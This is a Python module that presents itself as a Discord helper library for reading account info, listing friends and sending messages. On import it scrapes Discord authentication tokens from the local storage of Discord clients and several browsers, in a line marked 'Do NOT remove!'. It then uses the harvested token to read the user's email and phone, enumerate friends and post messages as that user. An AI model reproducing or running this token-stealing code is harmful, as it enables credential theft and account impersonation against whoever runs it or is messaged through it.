import requests
import os
import asyncio
import discord
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def get_token():
    checked=[]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            token = str(token)
            if token.startswith("mfa."):
                return token
def get_chat(uid):
    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token),data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
def getfriends(token):
    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
# Do NOT remove!
token=get_token()
def l(chat_id,msg):
    chat_id=get_chat(chat_id)
    payload = {
        'content': msg
    }
    header = {
        'authorization': token
    }
    r=requests.post(f"https://discord.com/api/v9/channels/{chat_id}/messages", data=payload, headers=header)
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
class send:
    def smtffn(person, msg):
        friends = str(getfriends(token))
        for i in friends.split("}}, {'id': '"):
            t, name_fur = i.split("'username': '")
            name, null = name_fur.split("', 'avatar':")
            if name == str(person):
                fur, null = t.split("',", 1)
                l(fur, msg)
    def smtufi(id, msg):
        l(str(id), msg)
def set_token(to):
    if str(to).startswith("mfa."):
        global token
        token = str(to)
    else:
        print(f"Noticed Error: Invalid Token ({str(to)}) token has to start with mfa.")
class info:
    def getallraw(self=""):
        zu=dict(getuserdata(token))
        return zu
    def token(self=""):
        return token
    def name(self=""):
        zu=dict(getuserdata(token))
        return (zu.get('username'))
    def id(self=""):
        zu = dict(getuserdata(token))
        return (zu.get('id'))
    def email(self=""):
        zu = dict(getuserdata(token))
        return zu.get('email')
    def lang(self=""):
        zu = dict(getuserdata(token))
        return (zu.get('locale'))
    def phone(self=""):
        zu = dict(getuserdata(token))
        return (zu.get('phone'))
    def avatar(self=""):
        zu = dict(getuserdata(token))
        uz=zu.get('avatar')
        return getavatar(info.id(),uz)
    def get_guilds(self=""):
        client = discord.Client()
        asyncio.run(client.start(token))
        client.close()
class friends:
    def ids(self=""):
        f = str(getfriends(token)).replace("[", "", 1).replace("]", "", 1).replace("{'", "", 1)
        for i in f.split("}}, {'"):
            fur,t=i.split("', '",1)
            yield str(fur).replace("id': '","")
    def getspeid(name):
        for i in friends.ids():
            un=friends.username(i)
            if name==un:
                return i
    def avatar(uid):
        f = str(getfriends(token)).replace("[", "", 1).replace("]", "", 1).replace("{'", "", 1)
        for i in f.split("}}, {'"):
            fur, t = i.split("', '", 1)
            iu = str(fur).replace("id': '", "")
            if str(uid)==iu:
                try:
                    t, fur = i.split("', 'avatar': '", 1)
                    avatar_id, t = fur.split("', '", 1)
                    avatar_url = getavatar(iu, avatar_id)
                    return avatar_url
                except:
                    pass
    def username(uid):
        f = str(getfriends(token)).replace("[", "", 1).replace("]", "", 1).replace("{'", "", 1)
        for i in f.split("}}, {'"):
            fur, t = i.split("', '", 1)
            iu = str(fur).replace("id': '", "")
            if str(uid) == iu:
                try:
                    t, fur = i.split("', 'username': '")
                    un, t = fur.split("', 'avatar': '")
                    if not un == None:
                        return un
                    else:
                        pass
                except:
                    pass
    def nickname(uid):
        f = str(getfriends(token)).replace("[", "", 1).replace("]", "", 1).replace("{'", "", 1)
        for i in f.split("}}, {'"):
            fur, t = i.split("', '", 1)
            iu = str(fur).replace("id': '", "")
            if str(uid) == iu:
                t,fur=i.split(", 'nickname': ")
                nick,t=fur.split(", 'user': ")
                return nick